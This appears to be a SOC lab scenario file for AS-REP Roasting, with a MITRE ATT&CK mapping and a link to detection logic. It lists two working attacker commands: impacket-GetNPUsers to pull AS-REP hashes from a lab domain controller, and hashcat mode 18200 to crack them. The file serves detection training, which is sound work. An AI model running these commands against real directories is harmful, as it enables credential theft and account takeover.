# INC-002 — AS-REP Roasting

## Scenario

Attacker identifies domain accounts with Kerberos pre-authentication disabled. Requests AS-REP tickets without authentication and cracks them offline.

**Attacker steps:**
1. `impacket-GetNPUsers soc.lab/ -no-pass -usersfile users.txt -dc-ip 172.16.0.5 -outputfile hashes.txt`
2. `hashcat -m 18200 hashes.txt wordlist.txt`

## MITRE ATT&CK Mapping

| Field | Value |
|-------|-------|
| Tactic | Credential Access |
| Technique | T1558.004 — AS-REP Roasting |
| Platform | Windows / Active Directory |

## Detection Logic
See [`detection.md`](./detection.md)

## Status
🔲 TODO — not yet executed
